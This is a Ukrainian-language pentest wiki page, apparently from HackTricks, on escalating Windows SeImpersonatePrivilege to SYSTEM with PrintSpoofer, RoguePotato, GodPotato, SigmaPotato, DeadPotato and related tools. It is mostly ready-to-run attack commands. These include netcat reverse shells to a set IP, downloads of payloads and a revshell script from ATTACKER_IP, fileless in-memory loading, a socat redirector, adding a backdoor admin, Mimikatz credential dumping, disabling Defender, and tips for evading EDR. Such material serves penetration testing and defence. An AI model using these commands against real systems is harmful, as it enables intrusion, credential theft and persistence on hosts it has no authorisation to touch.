# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** у Windows Server 2019 і Windows 10 build 1809 та новіших версіях. Однак [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можна використовувати, щоб **скористатися тими самими привілеями й отримати доступ рівня `NT AUTHORITY\SYSTEM`**. У цій [публікації в блозі](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально розглядається інструмент `PrintSpoofer`, за допомогою якого можна зловживати привілеями імперсонування на хостах Windows 10 і Server 2019, де JuicyPotato більше не працює.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Сучасна альтернатива, яку активно підтримують у 2024–2025 роках, — SigmaPotato (форк GodPotato), що додає використання reflection у пам’яті/.NET і підтримку додаткових версій ОС. Нижче наведено короткий приклад використання, а репозиторій — у розділі References.

Пов’язані сторінки з оглядовою інформацією та ручними методами:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Вимоги та поширені проблеми

Усі наведені нижче методи передбачають зловживання привілейованою службою, що підтримує імперсонування, з контексту, який має один із таких привілеїв:

- SeImpersonatePrivilege (найпоширеніший) або SeAssignPrimaryTokenPrivilege
- Високий рівень цілісності не потрібен, якщо токен уже має SeImpersonatePrivilege (типово для багатьох облікових записів служб, таких як IIS AppPool, MSSQL тощо)

Швидко перевірити привілеї:

```cmd
whoami /priv | findstr /i impersonate
```

Операційні примітки:

- Якщо ваша оболонка працює з обмеженим токеном без SeImpersonatePrivilege (поширено для Local Service/Network Service у деяких контекстах), відновіть привілеї облікового запису за замовчуванням за допомогою FullPowers, а потім запустіть Potato. Приклад: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Токен процесу може мати менше привілеїв, ніж інший токен того самого облікового запису служби або сеансу входу. У деяких конфігураціях клієнт іменованого каналу в тому самому сеансі може надати доступ до іншого токена з SeImpersonatePrivilege, але налаштований для служби параметр `RequiredPrivileges` і результат `whoami /priv` описують різні речі та не доводять, що такий токен доступний. Перевірте фактичний токен, перш ніж розглядати шлях імперсонації.
- Для PrintSpoofer потрібна запущена служба Print Spooler, доступна через локальну кінцеву точку RPC (spoolss). У захищених середовищах, де Spooler вимкнено після PrintNightmare, віддавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Для RoguePotato потрібен доступний через TCP/135 OXID resolver. Якщо вихідний трафік заблоковано, використайте перенаправлювач/переадресацію портів (див. приклад нижче). Перевірте прапорці, які підтримує використовувана збірка.
- EfsPotato/SharpEfsPotato використовують MS-EFSR; якщо один канал заблоковано, спробуйте альтернативні канали (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай свідчить про невідому або непідтримувану службу автентифікації RPC; спробуйте інший канал/транспорт або переконайтеся, що цільова служба запущена.
- «Усе-в-одному» форки, як-от DeadPotato, містять додаткові модулі для роботи з корисним навантаженням (Mimikatz/SharpHound/Defender off), які записують дані на диск; очікуйте вищого рівня виявлення EDR порівняно з полегшеними оригіналами.

## Коротка демонстрація

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Примітки:
- Можна використати -i, щоб запустити інтерактивний процес у поточній консолі, або -c, щоб виконати однорядкову команду.
- Потрібна служба Spooler. Якщо її вимкнено, це не спрацює.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

У [використанні upstream](https://github.com/antonioCoco/RoguePotato#usage) параметр `-e` задає команду, `-l` вибирає порт локального резолвера, а необов’язковий `-c` задає CLSID. Якщо активація COM запускає службу, шлях до виконуваного файлу якої вже змінено, ця служба може виконати змінену команду незалежно від імперсонації токена; перш ніж приписувати зафіксоване виконання з правами SYSTEM цій техніці, перевірте конфігурацію служби.

Якщо вихідний трафік через порт 135 заблоковано, перенаправте OXID resolver через socat на своєму redirector:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato — новий примітив зловживання COM, представлений наприкінці 2022 року. Він атакує службу **PrintNotify**, а не Spooler/BITS. Бінарний файл створює екземпляр COM-сервера PrintNotify, підміняє `IUnknown` на фальшивий, а потім запускає привілейований callback через `CreatePointerMoniker`. Коли служба PrintNotify (яка працює від імені **SYSTEM**) підключається у відповідь, процес дублює отриманий токен і запускає наданий payload із повними привілеями.<sup>[[13]](#references)</sup>

Основні примітки щодо використання:

* Працює на Windows 10/11 і Windows Server 2012–2022, якщо встановлена служба Print Workflow/PrintNotify (вона присутня, навіть коли застарілу службу Spooler вимкнено після PrintNightmare).
* Потрібно, щоб контекст виклику мав **SeImpersonatePrivilege** (типово для облікових записів служб IIS APPPOOL, MSSQL і запланованих завдань).
* Приймає безпосередньо команду або працює в інтерактивному режимі, тож можна залишатися в початковій консолі. Приклад:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Оскільки цей інструмент повністю базується на COM, він не потребує прослуховувачів іменованих каналів чи зовнішніх редиректорів, тож може безпосередньо замінити RoguePotato на хостах, де Defender блокує його прив’язування до RPC.

Такі оператори, як Ink Dragon, запускають PrintNotifyPotato одразу після отримання ViewState RCE на SharePoint, щоб перейти від робочого процесу `w3wp.exe` до SYSTEM перед встановленням ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Порада: Якщо один pipe не працює або EDR блокує його, спробуйте інші підтримувані pipes:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Нотатки:
- Працює у Windows 8/8.1–11 і Server 2012–2022, якщо наявний SeImpersonatePrivilege.
- Завантажте бінарний файл, що відповідає встановленому runtime (наприклад, `GodPotato-NET4.exe` на сучасному Server 2022).
- Якщо початковий примітив виконання — це webshell/UI з короткими тайм-аутами, розмістіть payload у вигляді скрипту й попросіть GodPotato запустити його замість довгої inline-команди.<sup>[[12]](#references)</sup>

Швидкий шаблон розміщення у доступному для запису webroot IIS:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato має два варіанти для роботи з об'єктами DCOM служб, для яких за замовчуванням використовується RPC_C_IMP_LEVEL_IMPERSONATE. Зберіть або використайте надані бінарні файли та виконайте команду:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (оновлений форк GodPotato)

SigmaPotato додає сучасні зручні можливості, як-от виконання в пам’яті через .NET reflection і допоміжний засіб для PowerShell reverse shell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Додаткові переваги у збірках 2024–2025 років (v1.2.x):
- Вбудований прапорець reverse shell `--revshell` і зняття обмеження PowerShell у 1024 символи, тож довгі payload-и для обходу AMSI можна запускати за один раз.
- Синтаксис, сумісний із Reflection (`[SigmaPotato]::Main()`), а також базовий трюк для обходу AV через `VirtualAllocExNuma()`, який збиває з пантелику прості евристики.
- Окремий `SigmaPotatoCore.exe`, скомпільований для .NET 2.0, для середовищ PowerShell Core.

### DeadPotato (переробка GodPotato 2024 року з модулями)

DeadPotato зберігає ланцюжок імперсонації GodPotato OXID/DCOM, але додає допоміжні засоби для post-exploitation, щоб оператори могли одразу отримати права SYSTEM і виконувати закріплення/збір даних без додаткових інструментів.<sup>[[15]](#references)</sup>

Поширені модулі (усі потребують SeImpersonatePrivilege):

- `-cmd "<cmd>"` — запустити довільну команду від імені SYSTEM.
- `-rev <ip:port>` — швидкий reverse shell.
- `-newadmin user:pass` — створити локального адміністратора для закріплення.
- `-mimi sam|lsa|all` — розмістити й запустити Mimikatz для дампу облікових даних (залишає файли на диску, помітно).
- `-sharphound` — запустити збір даних SharpHound від імені SYSTEM.
- `-defender off` — вимкнути захист Defender у реальному часі (дуже помітно).

Приклади команд в один рядок:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Оскільки він постачається з додатковими бінарними файлами, очікуйте більше спрацювань AV/EDR; коли важлива непомітність, використовуйте компактніші GodPotato/SigmaPotato.

## References

- [1] [PrintSpoofer — зловживання привілеями імперсонації у Windows 10 і Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Більше ніякого JuicyPotato? Стара історія — зустрічайте RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers — відновлення привілеїв токена за замовчуванням для сервісних облікових записів](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — витік NTLM через WMP → NTFS junction до webroot для RCE → FullPowers + GodPotato для SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — макрос LibreOffice → вебшелл IIS → GodPotato для SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research — Усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішньої будови прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato — переробка GodPotato з вбудованими модулями post-ex](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
